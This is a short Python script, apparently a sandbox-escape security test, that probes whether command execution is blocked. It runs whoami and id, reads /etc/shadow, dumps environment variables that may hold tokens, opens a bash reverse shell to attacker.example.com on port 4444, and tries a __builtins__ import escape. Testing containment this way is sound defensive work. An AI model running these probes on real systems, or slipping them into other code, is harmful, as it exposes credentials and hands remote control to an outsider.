# SECURITY TEST: Jailbreak via subprocess / os.system / eval
import subprocess, os

def probe(label, fn):
    print(f"=== {label} ===")
    try:
        result = fn()
        print(result if result else "SUCCESS - not blocked")
    except Exception as e:
        print(f"BLOCKED: {e}")

# 1. subprocess shell
probe("whoami", lambda: subprocess.check_output(["whoami"], text=True).strip())

# 2. os.system
probe("os.system id", lambda: os.system("id"))

# 3. Read /etc/shadow
probe("cat /etc/shadow", lambda: open("/etc/shadow").read())

# 4. Env dump (may expose secrets/tokens)
probe("env dump", lambda: subprocess.check_output(["env"], text=True))

# 5. Reverse shell via subprocess
probe("reverse shell", lambda: subprocess.call(
    ["bash", "-c", "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"]
))

# 6. __builtins__ escape (Python sandbox bypass attempt)
probe("__builtins__ escape", lambda: __builtins__.__dict__['__import__']('os').system('id'))
